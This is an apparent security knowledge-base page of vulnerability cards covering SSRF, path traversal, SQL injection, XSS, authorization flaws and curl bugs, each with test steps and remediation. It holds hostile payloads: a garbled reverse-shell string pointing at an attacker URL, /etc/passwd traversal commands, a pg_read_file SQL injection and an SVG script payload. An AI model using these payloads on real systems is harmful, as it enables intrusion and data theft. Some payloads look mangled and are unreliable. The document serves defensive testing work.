<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript code in the user&#x27;s browser, potentially leading to account compromise or data theft.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper input validation and output encoding to prevent the injection of malicious scripts. Use a Content Security Policy (CSP) to restrict the resources that the browser is allowed to load.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Blind SSRF via Webhook URL</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to trick the server into making HTTP requests to arbitrary URLs by manipulating a webhook URL parameter in an export process. This can lead to unauthorized access to internal resources or data exfiltration.  The server blindly forwards requests to attacker-controlled systems.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Send a POST request to the export endpoint with a crafted JSON payload.</li>
<li>Modify the <code>webhookUrl</code> parameter in the JSON payload to point to an attacker-controlled server.</li>
<li>The <code>webhookUrl</code> parameter should contain a command to execute on the target server, such as: <code>https://&lt;ATTACKER<em>URL&gt;/sh -i &amp; devtcp&lt;TARGET</em>IP&gt; 9001 0&amp;1</code></li>
<li>An example payload can be:</li>
</ol>
<pre><code>{
  &quot;id&quot;: 12345,
  &quot;name&quot;: &quot;test&quot;,
  &quot;oAuthRequired&quot;: false,
  &quot;draft&quot;: false,
  &quot;destination&quot;: &quot;WEBHOOK&quot;,
  &quot;properties&quot;: {
    &quot;webhookUrl&quot;: &quot;https://&lt;ATTACKER_URL&gt;/sh -i &amp; devtcp&lt;TARGET_IP&gt; 9001 0&amp;1&quot;,
    &quot;webhookType&quot;: &quot;CUSTOM&quot;
  },
  &quot;public&quot;: false
}</code></pre>
<ol>
<li>Monitor the attacker-controlled server for incoming requests from the target server, confirming the SSRF.  Verify the request contains the command payload.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to internal resources, data exfiltration, and potential for further exploitation.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Validate and sanitize all user-supplied URLs. Implement strict access controls and network segmentation to prevent access to sensitive internal resources. Use allowlists for acceptable URLs and block all others.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Calendar Attachment Download</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> Calendar attachments, when presented for download, might expose local files if not properly sanitised. This could allow an attacker to retrieve files from the server&#x27;s filesystem that they should not have access to. Proper validation of file extensions and paths is essential.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Create a calendar entry with an attachment.</li>
<li>Observe the download link or mechanism for the attachment.</li>
<li>Attempt to modify the attachment URL to include a path traversal sequence, like <code>&lt;PAYLOAD&gt;</code> (e.g., <code>../../../../etc/passwd</code>).</li>
<li>Check if the server serves a file from the manipulated path. Example payload: <code>../../../../etc/passwd</code></li>
<li>Verify the file extension is properly validated and restricted to expected types.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Retrieval of sensitive files from the server&#x27;s filesystem.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict file validation and path sanitisation when handling attachments, particularly when constructing download URLs. Use whitelists for allowed file extensions.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Missing Ownership Check - Cross-Table Column Movement</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a user to move a column from one table to another table belonging to a different user. This can lead to data modification and potential privilege escalation, as users can manipulate data they should not have access to. The vulnerability arises from a failure to verify ownership during column movement operations.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Log in to the application as User A.</li>
<li>Create Table A with at least one column.</li>
<li>Log in to the application as User B.</li>
<li>Create Table B.</li>
<li>While logged in as User A, attempt to move a column from Table A to Table B using the application&#x27;s column manipulation interface, or through an API call if one is available.  The request may include parameters like <code>source<em>table</em>id</code>, <code>destination<em>table</em>id</code>, and <code>column<em>id</code>.  Example Payload: <code>source</em>table<em>id=&lt;TABLE</em>A<em>ID&gt;&amp;destination</em>table<em>id=&lt;TABLE</em>B<em>ID&gt;&amp;column</em>id=&lt;COLUMN_ID&gt;</code>.</li>
<li>Verify if the column movement is successful without proper ownership verification.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized data modification, potential privilege escalation, and compromise of data integrity.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust ownership checks before allowing any data manipulation operations between tables. Ensure users can only interact with tables they own or have explicit permissions to modify.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Metadata Disclosure</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves the exposure of sensitive metadata associated with tables, potentially allowing an attacker to gain insights into the structure and internal workings of a data storage system. This information can be used to plan further attacks or bypass security measures. The disclosure of metadata can lead to unauthorized data access or manipulation.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Navigate to the tables application at <code>&lt;TARGET_URL&gt;</code>.</li>
<li>Attempt to access metadata for a table using a crafted URL or API request. This could involve manipulating table names or identifiers in the request. For example: <code>&lt;TARGET<em>URL&gt;/tables/&lt;TABLE</em>NAME&gt;/metadata</code>.</li>
<li>Observe the response to identify any exposed metadata, such as column names, data types, or other sensitive information. The payload would be a manipulated URL.</li>
<li>Use the following payload as an example: <code>&lt;TARGET<em>URL&gt;/tables/sensitive</em>table/metadata</code>.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized disclosure of table metadata, leading to potential data exfiltration or manipulation.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access controls to restrict metadata access to authorized users only. Sanitize and validate all user inputs to prevent manipulation of table identifiers.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Blind Poll Draft Deletion</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A user can delete another user’s poll draft without knowing anything about it, only the draft ID. This allows for unauthorized data removal and potential denial of service. The vulnerability arises from a lack of proper authorization checks during the deletion process.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Obtain the ID of a poll draft belonging to another user. This may involve observing network requests or using other vulnerabilities to enumerate IDs.</li>
<li>Construct a request to delete the poll draft, using the obtained ID in the relevant request parameter. For example: <code>DELETE &lt;TARGET<em>URL&gt;/polls/drafts/&lt;DRAFT</em>ID&gt;</code></li>
<li>Verify that the poll draft is successfully deleted without authentication or authorization. A successful response might be a 204 No Content status code.</li>
<li>Observe if the original user is notified or aware of the deletion.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized deletion of poll drafts, potentially leading to data loss and disruption of user workflows.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authorization checks to ensure that users can only delete their own poll drafts. Validate all input parameters, including IDs, to prevent manipulation. Provide clear feedback to users regarding deletion actions.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Permission Modification via Shared Access</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This issue involves a user with permission to share resources being able to modify the access permissions of other users who are not owners. This bypasses intended access controls, potentially leading to unauthorized access or modification of data. It highlights a flaw in permission management logic.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Ensure user A has permission to share a resource (e.g., a folder or file) with other users.</li>
<li>Ensure user B is a non-owner user with access to the same resource.</li>
<li>Using user A’s session, attempt to modify the permissions granted to user B for the shared resource. Example payload: <code>&lt;PAYLOAD&gt;</code> (This would be a request body containing JSON or XML data to modify the access level, e.g., changing read-only access to full write access).</li>
<li>Verify that the permission change is successful and user B&#x27;s access level is modified without their consent or the owner&#x27;s knowledge.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data or the ability to modify data belonging to other users.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter access controls to prevent users with sharing permissions from modifying the permissions of other users.  Ensure permission changes require explicit owner approval or follow a least-privilege principle.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Unauthorised Appointment Booking</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> The application allowed users to book appointments without proper authentication or a valid token. This lack of proper authorization could potentially allow an attacker to create appointments on behalf of other users, leading to scheduling conflicts or denial of service. The vulnerability highlights a critical flaw in the application’s access control mechanism.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Send a POST request to the appointment booking endpoint, located at <code>&lt;TARGET_URL&gt;/booking</code>.</li>
<li>Include the appointment details in the request body, such as the start time, end time, resource ID, and user ID.</li>
<li>Omit the authentication token or provide an invalid token in the request headers.</li>
<li>Observe whether the appointment is successfully booked without proper authentication.</li>
</ol>
<p>Example Payload: <code>{&quot;start&quot;:&quot;2024-01-01T10:00:00Z&quot;, &quot;end&quot;:&quot;2024-01-01T11:00:00Z&quot;, &quot;resourceId&quot;:&quot;room1&quot;, &quot;userId&quot;:&quot;user2&quot;}</code></p>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker could potentially book appointments on behalf of other users, leading to scheduling conflicts or denial of service.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Always validate user authentication and authorization before allowing any actions that modify data or resources. Ensure that every request includes a valid and properly verified token.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Unauthorised Share Enumeration</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This issue allows an attacker to enumerate shares in a system without proper authorisation. This can reveal information about the data being shared and potentially lead to unauthorised access. The vulnerability represents a regression from a previously fixed issue.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Send a GET request to <code>&lt;TARGET_URL&gt;/apps/tables/public/shares?id=&lt;PARAMETER&gt;</code> where <code>&lt;PARAMETER&gt;</code> is the ID of a table.</li>
<li>Observe the response. The response should require authentication, but if the vulnerability exists, shares might be enumerated without authentication.</li>
<li>Example Payload: <code>/apps/tables/public/shares?id=123</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Information disclosure; potential for unauthorized access.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper access controls to prevent unauthenticated users from enumerating shares. Ensure fixes from prior vulnerabilities are correctly implemented and tested.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Stored Cross-Site Scripting via SVG Upload</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious JavaScript code into a website through an SVG file upload. When other users view the SVG file, the attacker&#x27;s JavaScript executes in their browser context, potentially leading to account compromise or data theft. This is a significant risk as it bypasses typical sanitization measures.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Locate an upload functionality that accepts SVG files on &lt;TARGET_URL&gt;.</li>
<li>Upload an SVG file containing a malicious JavaScript payload. For example: <code>&lt;svg&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&lt;/svg&gt;</code>.</li>
<li>Verify that the SVG file renders correctly and that the injected JavaScript executes when the file is viewed by another user accessing &lt;TARGET<em>URL&gt;/&lt;UPLOADED</em>FILE&gt;.</li>
<li>Use a browser&#x27;s developer tools to confirm the presence and execution of the JavaScript payload.</li>
<li>Test with different JavaScript injection techniques and payload obfuscation to assess the effectiveness of input validation and output encoding.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker can execute arbitrary JavaScript code in the context of another user&#x27;s browser, potentially leading to session hijacking, account takeover, or defacement.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation on all uploaded files, including SVG files. Sanitize SVG content to remove or encode potentially malicious code. Use output encoding when rendering SVG files to prevent XSS attacks.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Weak Cryptography Defaults in Curl with GnuTLS</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> Curl, when compiled with the GnuTLS backend, may default to weak cryptographic parameters, potentially allowing connections to servers using insecure ciphers. This can increase the risk of man-in-the-middle attacks if a poorly configured server is targeted. This vulnerability exists because the default GnuTLS security level is set to &quot;NORMAL,&quot; which allows the usage of older, less secure algorithms.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Compile Curl with the GnuTLS backend: <code>./configure --with-gnutls; make</code></li>
<li>Test connections to servers known to use weak configurations: <code>./src/curl https://dh1024.badssl.com/ https://dh-small-subgroup.badssl.com/ https://dh-composite.badssl.com/</code></li>
<li>Examine the cipher suites used during the connection to confirm that weak algorithms are negotiated. The output can be viewed using the <code>-v</code> or <code>--verbose</code> flag in curl: <code>./src/curl -v &lt;TARGET_URL&gt;</code></li>
<li>Verify the security level by checking the GnuTLS priority string, aiming to ensure <code>SECURE192</code> is being used as the base level.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker with a poorly configured server can potentially downgrade the encryption strength, enabling them to perform man-in-the-middle attacks and compromise sensitive data.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Configure Curl to use a more secure GnuTLS priority string, such as <code>SECURE192</code>, which enforces stronger ciphers and algorithms. Review and update GnuTLS configuration to ensure it aligns with current security best practices.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">SQL Injection via Filtered Relation</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability occurs when user-supplied data is improperly sanitized and incorporated into a SQL query, allowing an attacker to inject malicious SQL code. The injected code can be used to read sensitive data, modify database content, or even execute arbitrary commands on the database server.  This specifically targets systems using PostgreSQL and its raw string capabilities within SQL queries.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Construct a malicious SQL payload containing PostgreSQL raw string delimiters (e.g., <code>$$</code>) and commands.</li>
<li>Inject the payload into a user-supplied parameter or field that is incorporated into a SQL query, specifically within the context of a filtered relation annotation.</li>
<li>Observe if the injected command is executed, demonstrating successful SQL injection.</li>
</ol>

<p>Example Payload: <code>$a$,$b$,$c$,(1)from(select(1)id,(pg<em>read</em>file($$/etc/passwd$$))title,(3)author<em>id,(4)editor</em>id,(5)number<em>editor,(6)editor</em>number,(7)state)filtered<em>relation</em>book,(select(1),1</code></p>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data, modification of database records, and potential remote code execution on the database server.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Properly sanitize user input before incorporating it into SQL queries. Escape or filter special characters, and use parameterized queries or prepared statements to prevent SQL injection vulnerabilities.  Ensure that any regular expressions used for filtering user input are comprehensive and account for potential injection vectors.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Economic Denial of Service via Callback Gas Exploitation</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows attackers to manipulate callback mechanisms in inter-chain communication protocols, causing financial harm to relayers and disrupting cross-chain functionality. It exploits a mismatch between the simulated gas cost and the actual gas consumed during callback execution.  This results in a denial of service for applications relying on cross-chain transactions.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Determine the maximum gas limit set for callbacks within the target inter-chain communication protocol&#x27;s configuration.</li>
<li>Deploy a smart contract that executes computationally expensive operations (e.g., nested loops, hashing algorithms) designed to consume slightly under the determined gas limit (e.g., <code>&lt;GAS<em>LIMIT</em>LESS<em>THAN</em>MAX&gt;</code>). The contract must return a success status.</li>
<li>Construct an inter-chain message (e.g., <code>MsgTransfer</code>) and include a <code>memo</code> field containing the address of the deployed contract as the callback destination.</li>
<li>Trigger the relay process and monitor the gas consumption during callback execution. Verify that the simulation passes because the contract returns &quot;success&quot; and the gas consumption is below the limit.</li>
<li>Repeat the process multiple times to observe the financial impact on the relayer node.</li>
<li>Example Payload: <code>&lt;PAYLOAD: {&quot;sender&quot;:&quot;&lt;SENDER<em>ADDRESS&gt;&quot;, &quot;receiver&quot;:&quot;&lt;RECEIVER</em>ADDRESS&gt;&quot;, &quot;amount&quot;:1, &quot;memo&quot;:&quot;&lt;CONTRACT_ADDRESS&gt;&quot;}&gt;</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Financial losses for relayers, disruption of cross-chain communication, and potential loss of trust in the underlying protocol.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter gas limit enforcement during callback execution, require senders to specify and pay for callback gas usage, and enhance simulation logic to account for actual gas consumption instead of just success/failure status.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Unsafe JavaScript Execution via Curl</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when a command-line tool like curl, used to fetch data from a server, executes JavaScript code instead of simply displaying or handling it appropriately. This can lead to unexpected behaviour, potential security risks, and denial-of-service scenarios. The problem is more apparent in shells that execute code instead of just outputting it.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Host an endpoint that returns a JavaScript payload, such as <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. For example, <code>ctf.eztfsp.lv:8009/test.js</code>.</li>
<li>Open a PowerShell terminal.</li>
<li>Run the following command: <code>curl &lt;TARGET_URL&gt;</code> (e.g., <code>curl ctf.eztfsp.lv:8009/test.js</code>).</li>
<li>Observe if a JavaScript alert window appears (&quot;message from webpage 1&quot; in the report).</li>
<li>Try to terminate the curl process using Ctrl+C and note if it hangs.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unexpected JavaScript execution can lead to denial-of-service, potentially harmful script execution, and compromise system integrity.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong>  Ensure command-line tools handle responses as text or data, not as executable code. Properly sanitize or escape any dynamically generated content before serving it, and consider using safer alternatives if code execution is not needed.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Network">
      <button type="button" class="card-toggle">
        <span class="card-title">FTP EPSV State Machine Infinite Loop</span>
        <span class="card-meta-mini">
          <span class="badge">Network</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> When using EPSV mode with a malicious FTP server that doesn&#x27;t send data after establishing a connection, the curl program enters an infinite loop due to a flawed state machine. This prevents the program from completing the transfer or exiting normally.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Start a malicious FTP server on a network port. This server should establish an EPSV connection but not send any data.  A Python script like the one provided can be used.</li>
<li>Execute the <code>curl</code> command using EPSV mode to download a file, providing dummy credentials.  For example: <code>./curl -u anonymous:123 &#x27;ftp://&lt;TARGET<em>URL&gt;/test&#x27; -o ./test</code>. Use a test file name like &#x27;test&#x27; and a target URL like <code>&lt;TARGET</em>URL&gt;</code>.</li>
<li>Observe that the <code>curl</code> program enters an infinite loop and does not complete the transfer or exit.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Denial of service – the <code>curl</code> process becomes unresponsive, consuming resources and preventing further network operations.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Improve the error handling within the state machine to properly detect and recover from situations where data is not received after establishing an EPSV connection. Implement timeouts and checks for expected data to prevent infinite loops.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Network">
      <button type="button" class="card-toggle">
        <span class="card-title">Heap Buffer Overflow in TFTP Transfer</span>
        <span class="card-meta-mini">
          <span class="badge">Network</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A heap buffer overflow can occur when a TFTP server sends an Option Acknowledgment (OACK) packet with a block size exceeding the default, leading to memory corruption and potential remote code execution or denial of service. This vulnerability is due to inadequate buffer reallocation during the block size update.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Configure a TFTP server to send an OACK packet with a <code>blksize</code> option greater than the default (e.g., 2048).</li>
<li>Use a TFTP client (e.g., <code>curl</code>) to initiate a file transfer from the malicious server: <code>curl tftp://&lt;TARGET_URL&gt;:&lt;PORT&gt;/test</code>.</li>
<li>Observe if the client application crashes or exhibits unexpected behavior.</li>
<li>Monitor memory for corruption using debugging tools.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Potential for remote code execution or denial of service due to heap buffer overflow. An attacker could overwrite critical data or function pointers, leading to arbitrary code execution with the privileges of the affected process.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that when a TFTP server provides a larger block size, the receive and send buffers are reallocated to accommodate the new size. Validate input sizes and allocate sufficient memory to prevent overflows.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Path Traversal in File URI Scheme</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> The <code>file://</code> URI scheme handler fails to properly sanitise directory traversal sequences, enabling an attacker to access arbitrary files on the system. This poses a significant risk when the URI is constructed from untrusted input.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Use a command-line tool like <code>curl</code> or similar to retrieve a file using a <code>file://</code> URI.</li>
<li>Craft a <code>file://</code> URI containing directory traversal sequences (<code>../</code>) to escape the intended directory.</li>
<li>Attempt to access sensitive system files, like a password file.</li>
</ol>
<pre><code>    curl &quot;file:///any/dummy/path/../../../../../../etc/passwd&quot;</code></pre>
<ol>
<li>Observe whether the command successfully retrieves the contents of the intended file, bypassing the intended path.</li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Arbitrary file read, potentially exposing sensitive configuration files, source code, or system files.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust sanitisation or validation of directory paths when handling <code>file://</code> URIs. Avoid constructing <code>file://</code> URIs directly from user input and implement strict access controls on the filesystem.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="API">
      <button type="button" class="card-toggle">
        <span class="card-title">Unauthenticated GraphQL Schema Access</span>
        <span class="card-meta-mini">
          <span class="badge">API</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> GraphQL APIs often expose a schema introspection endpoint that allows clients to discover the available types and fields. An attacker may be able to bypass authentication mechanisms by prefixing private or internal GraphQL operations with &quot;__schema&quot;, enabling unauthorized access to sensitive information or functionality. This poses a risk to data confidentiality and potentially allows for unauthorized modifications.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Send a GraphQL query to the target API endpoint, prepending &quot;<strong>schema&quot; to the operation name. For example: <code></strong>schema { type MyPrivateType { field1: String } }</code></li>
<li>Observe the response. A successful response indicates the attacker can access the schema without authentication.</li>
<li>Experiment with different operation names prefixed with &quot;__schema&quot; to attempt access to other private or internal functionalities.</li>
<li>Use tools like <code>curl</code> to craft the request: <code>curl -X POST &lt;TARGET<em>URL&gt;/graphql -H &quot;Content-Type: application/json&quot; -d &#x27;{&quot;query&quot;: &quot;</em>_schema { type MyPrivateType { field1: String } }&quot;}&#x27;</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data or functionality within the GraphQL API. Potential for data breaches and modification of system behaviour.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper authentication and authorization checks for all GraphQL operations. Restrict access to the schema introspection endpoint to authenticated users only. Use schema directives or custom resolvers to control access to sensitive fields and types.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Leading Dot Hostname Validation Bypass</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker with a wildcard certificate for a domain to bypass hostname verification by connecting to a hostname that begins with a dot. The validation logic incorrectly treats the leading dot as part of the hostname, causing a mismatch in certificate validation. This can lead to man-in-the-middle attacks.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Generate a wildcard certificate for a domain (e.g., *.test.local).</li>
<li>Configure a local server to accept connections on a specific port (e.g., 9443).</li>
<li>Use a tool like <code>curl</code> to connect to a hostname that starts with a dot (e.g., .test.local:9443) and specify the wildcard certificate for verification.</li>
<li>Check if the connection is successful and the hostname is not rejected.</li>
<li>Run: <code>chmod +x poc.sh</code> and <code>./poc.sh /path/to/curl</code></li>
</ol>

<p><strong class="section-heading section-impact">Impact:</strong> An attacker can perform man-in-the-middle attacks on HTTPS connections by exploiting this bypass.</p>

<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that hostname validation correctly handles hostnames starting with a dot.  The hostname should be verified without including the leading dot.</p>
        <div class="card-meta">
          <span>Added: 2025-12-26</span>
        </div>
      </div>
    </article>
    

    <article class="card" data-category="Web App">
      <button type="button" class="card-toggle">
        <span class="card-title">Stack Buffer Overflow in TLS Error Handling</span>
        <span class="card-meta-mini">
          <span class="badge">Web App</span>
          <span class="chevron" aria-hidden="true">▸</span>
        </span>
      </button>
      <div class="card-body">
        <p><strong class="section-heading section-description">Description:</strong> A stack-based buffer overflow occurs when handling TLS errors, potentially leading to application crashes or, in some cases, arbitrary code execution. This happens because an error message is copied into a fixed-size buffer without sufficient bounds checking. This vulnerability is more critical in production environments where debugging checks are disabled.</p>

<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
<ol>
<li>Identify a service using a cURL-based TLS library.</li>
<li>Trigger a TLS error condition within the service. This might involve sending malformed TLS packets or configuring the service to use an invalid certificate.</li>
<li>Monitor the service&#x27;s memory usage for signs of a stack overflow, which may manifest as crashes or unexpected behavior.</li>
<li>Observe the vulnerability with the following payload and test program:</li>
</ol>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

static char *wssl_strerror(unsigned long error, char *buf, unsigned long size) {
    *buf = &#x27;\0&#x27;;
    if(!*buf) {
        const char *msg = error ? &quot;Unknown error&quot; : &quot;No error&quot;;
        strcpy(buf, msg); // VULNERABLE CALL: ignores `size`
    }
    return buf;
}
int main() {
    char small_buffer[12];
    wssl_strerror(1, small_buffer, 12);
    printf(&quot;Result: %s\n&quot;, small_buffer);
    return 0;
}</code></pre>
<p>Compile the above code, then execute it to check for memory overflow.</p>

